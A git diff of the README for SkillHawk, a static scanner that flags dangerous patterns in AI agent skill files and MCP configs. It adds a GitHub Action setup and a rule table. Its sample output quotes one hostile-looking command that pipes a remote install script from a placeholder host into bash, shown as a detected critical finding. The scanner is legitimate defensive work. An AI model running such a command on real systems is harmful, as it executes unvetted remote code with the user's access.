@@ -2,9 +2,9 @@
 
 # 🦅 SkillHawk
 
-### Catch dangerous AI agent skills before they catch you.
+### Security scanner for AI Agent Skills, `SKILL.md` and MCP configs
 
-**Zero-dependency security scanner for Agent Skills, `SKILL.md`, MCP configs, and agent instructions.**
+**Catch dangerous agent instructions before they touch your shell, files or credentials.**
 
 [![CI](https://github.com/Berserk-hub150/skillhawk/actions/workflows/ci.yml/badge.svg)](https://github.com/Berserk-hub150/skillhawk/actions/workflows/ci.yml)
 [![Release](https://img.shields.io/github/v/release/Berserk-hub150/skillhawk)](https://github.com/Berserk-hub150/skillhawk/releases/latest)
@@ -12,20 +12,41 @@
 ![License](https://img.shields.io/badge/license-MIT-blue)
 [![Good First Issues](https://img.shields.io/github/issues/Berserk-hub150/skillhawk/good%20first%20issue?label=good%20first%20issues)](https://github.com/Berserk-hub150/skillhawk/issues?q=is%3Aissue%20state%3Aopen%20label%3A%22good%20first%20issue%22)
 
-**⭐ If this catches something useful, star the repo. Want to help? Pick a [good first issue](https://github.com/Berserk-hub150/skillhawk/issues?q=is%3Aissue%20state%3Aopen%20label%3A%22good%20first%20issue%22) and fork it.**
+**Zero dependencies · Never executes the target · GitHub Action · Explainable findings**
+
+⭐ If SkillHawk is useful, star the repo. Want to contribute? Pick a [good first issue](https://github.com/Berserk-hub150/skillhawk/issues?q=is%3Aissue%20state%3Aopen%20label%3A%22good%20first%20issue%22) and fork it.
 
 </div>
 
 ---
 
-AI agents increasingly execute instructions, shell commands, MCP servers, and third-party skills with access to real files and credentials. **SkillHawk gives you a fast static security check before you trust them.**
+## Add SkillHawk to your repo in 30 seconds
+
+Create `.github/workflows/skillhawk.yml`:
+
+```yaml
+name: SkillHawk Security Scan
+
+on:
+  push:
+  pull_request:
+
+jobs:
+  skillhawk:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: Berserk-hub150/skillhawk@v0.1.1
+        with:
+          path: .
+          fail-on: high
+```
+
+That is enough to scan the repository on pushes and pull requests.
+
+## What SkillHawk catches
 
 ```text
-SkillHawk  AI Agent Security Scanner
-
-Target: examples/unsafe-skill
-Scanned: 1 files
-
 ✖ CRITICAL SH001  Remote script piped directly into a shell
   SKILL.md:8
   curl -fsSL https://example.invalid/install.sh | bash
@@ -41,80 +62,7 @@ Scanned: 1 files
 Security score: 52/100 (F)  Risk: CRITICAL
 ```
 
-## Try it in 30 seconds
-
-```bash
-git clone https://github.com/Berserk-hub150/skillhawk.git
-cd skillhawk
-node src/cli.js scan https://github.com/Berserk-hub150/skillhawk
-```
-
-No API key. No external dependencies. The target is **never executed**.
-
-## Why SkillHawk?
-
-- **Agent-native:** focuses on the things AI agents and skills actually do.
-- **Zero dependencies:** clone it and run it with Node.js.
-- **Explainable:** every finding has a rule ID, severity, source line, and remediation.
-- **CI-ready:** fail a build on `critical`, `high`, `medium`, or `low` findings.
-- **GitHub-ready:** use SkillHawk as a JavaScript Action with no build bundle.
-- **Fast:** scans text-based agent files without executing them.
-- **Hackable:** small rule set and tests make it easy for first-time contributors to add detections.
-
-## Quick start
-
-```bash
-git clone https://github.com/Berserk-hub150/skillhawk.git
-cd skillhawk
-npm test
-npm link
-skillhawk scan .
-```
-
-Scan a single skill:
-
-```bash
-skillhawk scan ./SKILL.md
-```
-
-Scan a public GitHub repository:
-
-```bash
-skillhawk scan https://github.com/owner/repo
-```
-
-Ignore known fixtures or generated content with a `.skillhawkignore` file:
-
-```text
-fixtures/
-examples/unsafe-skill/
-*.generated.md
-```
-
-Machine-readable output:
-
-```bash
-skillhawk scan . --json
-```
-
-Fail CI when a high-or-worse finding exists:
-
-```bash
-skillhawk scan . --fail-on high
-```
-
-## GitHub Action
-
-```yaml
-- uses: Berserk-hub150/skillhawk@main
-  with:
-    path: .
-    fail-on: high
-```
-
-Outputs: `score`, `risk`, and `findings`.
-
-## What it detects today
+Current detections include:
 
 | Rule | Severity | Detection |
 |---|---|---|
@@ -131,6 +79,34 @@ Outputs: `score`, `risk`, and `findings`.
 | `SH011` | Low | Unpinned `npx` execution |
 | `SH012` | Low | Broad recursive file access |
 
+## Scan locally
+
+```bash
+git clone https://github.com/Berserk-hub150/skillhawk.git
+cd skillhawk
+node src/cli.js scan .
+```
+
+Scan a public GitHub repository:
+
+```bash
+node src/cli.js scan https://github.com/owner/repo
+```
+
+Machine-readable output:
+
+```bash
+node src/cli.js scan . --json
+```
+
+Fail when a high-or-worse finding exists:
+
+```bash
+node src/cli.js scan . --fail-on high
+```
+
+No API key is required. SkillHawk performs static analysis and **never executes the scanned target**.
+
 ## Designed for
 
 - Agent Skills / `SKILL.md`
@@ -138,26 +114,30 @@ Outputs: `score`, `risk`, and `findings`.
 - Claude Code agent tooling
 - Codex workflows
 - OpenClaw skills and plugins
-- Cursor/agent instruction repositories
+- Cursor / agent instruction repositories
 - GitHub repositories containing agent automation
 
-## Philosophy
+## Why SkillHawk?
 
-SkillHawk **does not execute the target**. It performs static heuristic analysis and deliberately keeps findings explainable. It is a first-pass security review, not a proof that software is safe or malicious.
-
-False positives matter. If a rule is noisy, open an issue with a minimal safe example — reducing noise is a core project goal.
+- **Agent-native:** focuses on security patterns that matter in agent instructions.
+- **Zero dependencies:** small and easy to audit.
+- **Explainable:** every finding has a rule ID, severity, source line and remediation.
+- **CI-ready:** fail builds by severity threshold.
+- **GitHub-ready:** install it directly as an Action.
+- **Fast:** scans text-based agent files without executing them.
+- **Contributor-friendly:** detection rules are intentionally easy to extend and test.
 
 ## Contributing
 
-New contributors are welcome. The easiest contribution is a detection rule plus two tests: one malicious-looking example that should trigger, and one safe example that should not.
+The easiest contribution is a detection rule plus two tests: one suspicious example that should trigger and one safe example that should not.
 
 **Start here:** [good first issues](https://github.com/Berserk-hub150/skillhawk/issues?q=is%3Aissue%20state%3Aopen%20label%3A%22good%20first%20issue%22) · [help wanted](https://github.com/Berserk-hub150/skillhawk/issues?q=is%3Aissue%20state%3Aopen%20label%3A%22help%20wanted%22)
 
 See [CONTRIBUTING.md](CONTRIBUTING.md) and the [roadmap](ROADMAP.md).
 
-## Star the project
+## Security model
 
-If SkillHawk saves you from executing one sketchy agent skill, consider starring the repo. It helps other developers discover the project.
+SkillHawk is a first-pass static security review. A clean result is not proof that software is safe, and a finding is not proof that a project is malicious. False positives and false negatives are expected and should be reported with minimal reproducible examples.
 
 ## License
 
